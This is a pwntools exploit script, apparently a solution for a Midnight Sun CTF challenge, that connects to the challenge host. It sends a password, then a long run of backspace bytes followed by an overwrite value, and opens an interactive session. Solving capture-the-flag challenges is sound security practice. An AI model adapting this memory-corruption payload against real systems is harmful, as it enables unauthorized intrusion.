#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or 'hfs-os-01.play.midnightsunctf.se'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.clean()
io.send('sojupwner\r')
#io.clean()
#io.send('\x7f'*34+"AAAA")
#io.clean()
#io.send('\x7f'*34+"BBBB")
io.clean()
io.send("\x7f"*265+"\xe8\x08\x00\r")
io.clean()
io.send("pong")

io.interactive()

